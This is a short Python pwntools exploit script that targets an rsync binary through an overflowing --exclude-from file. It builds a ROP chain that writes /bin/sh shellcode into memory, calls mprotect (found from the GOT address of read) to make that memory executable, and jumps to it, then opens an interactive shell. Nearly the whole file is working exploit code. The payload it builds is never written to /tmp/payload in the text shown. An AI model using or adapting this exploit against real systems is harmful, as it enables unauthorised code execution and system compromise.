from pwn import *

# shellcode from http://shell-storm.org/shellcode/files/shellcode-603.php
rop = (
   p64(0x000000000040ae0e) # pop rax; pop rbx; pop rbp; ret
 + p64(0x000000000067f540) # shellcode write area + 0x20
 + p64(0x4d4d4d4d4d4d4d4d) # PADDING
 + p64(0x4d4d4d4d4d4d4d4d) # PADDING
 + p64(0x0000000000402fe2) # pop rdx; ret
 + p64(0x4b4b4b4b4b4b4b05) # shellcode bytes
 + p64(0x0000000000431070) # mov QWORD PTR [rax],rdx; pop rbp; ret
 + p64(0x4949494949494949) # PADDING
 + p64(0x000000000040ae0e) # pop rax; pop rbx; pop rbp; ret
 + p64(0x000000000067f538) # shellcode write area + 0x18
 + p64(0x4d4d4d4d4d4d4d4d) # PADDING
 + p64(0x4d4d4d4d4d4d4d4d) # PADDING
 + p64(0x0000000000402fe2) # pop rdx; ret
 + p64(0x0f3bb0e689485750) # shellcode bytes
 + p64(0x0000000000431070) # mov QWORD PTR [rax],rdx; pop rbp; ret
 + p64(0x4949494949494949) # PADDING
 + p64(0x000000000040ae0e) # pop rax; pop rbx; pop rbp; ret
 + p64(0x000000000067f530) # shellcode write area + 0x10
 + p64(0x4d4d4d4d4d4d4d4d) # PADDING
 + p64(0x4d4d4d4d4d4d4d4d) # PADDING
 + p64(0x0000000000402fe2) # pop rdx; ret
 + p64(0xe789485308ebc148) # shellcode bytes
 + p64(0x0000000000431070) # mov QWORD PTR [rax],rdx; pop rbp; ret
 + p64(0x4949494949494949) # PADDING
 + p64(0x000000000040ae0e) # pop rax; pop rbx; pop rbp; ret
 + p64(0x000000000067f528) # shellcode write area + 0x8
 + p64(0x4d4d4d4d4d4d4d4d) # PADDING
 + p64(0x4d4d4d4d4d4d4d4d) # PADDING
 + p64(0x0000000000402fe2) # pop rdx; ret
 + p64(0x68732f6e69622f2f) # shellcode bytes
 + p64(0x0000000000431070) # mov QWORD PTR [rax],rdx; pop rbp; ret
 + p64(0x4949494949494949) # PADDING
 + p64(0x000000000040ae0e) # pop rax; pop rbx; pop rbp; ret
 + p64(0x000000000067f520) # shellcode write area
 + p64(0x4d4d4d4d4d4d4d4d) # PADDING
 + p64(0x4d4d4d4d4d4d4d4d) # PADDING
 + p64(0x0000000000402fe2) # pop rdx; ret
 + p64(0xbb48c03148d23148) # shellcode bytes
 + p64(0x0000000000431070) # mov QWORD PTR [rax],rdx; pop rbp; ret
 + p64(0x4949494949494949) # PADDING
 + p64(0x0000000000403432) # pop rbp; ret
 + p64(0x000000000067f218) # address of read in GOT + 8
 + p64(0x000000000045cf82) # mov rax,QWORD PTR [rbp-0x8]; pop rbp; ret
 + p64(0x4d4d4d4d4d4d4d4d) # PADDING
 + p64(0x0000000000461d02) # pop rsi; add r9b, r9b; ret
 + p64(0x000000000000a310) # Offset from read to mprotect in libc
 + p64(0x00000000004431f3) # add rax, rsi; pop rbp; ret
 + p64(0x4949494949494949) # PADDING
 + p64(0x0000000000402fe2) # pop rdx; ret
 + p64(0x0000000000000007) # PROT_READ | PROT_WRITE | PROT_EXEC
 + p64(0x000000000040fad4) # pop rsi; pop rbp; ret
 + p64(0x0000000000002000) # length of mprotect area
 + p64(0x4d4d4d4d4d4d4d4d) # PADDING
 + p64(0x0000000000452aa9) # pop rdi; pop rbp; ret
 + p64(0x000000000067f000) # address of mprotect area
 + p64(0x4d4d4d4d4d4d4d4d) # PADDING
 + p64(0x000000000040345e) # jmp rax
 + p64(0x000000000067f520) # shellcode write area
)

payload = ("A" * 5696) + "J"*8 + rop

print "Starting rsync with the exploit payload"
filename = './rsync'
p = process(argv = [filename, '-r', '--exclude-from=/tmp/payload', '.', '/tmp/to/'], executable = filename)
p.interactive()
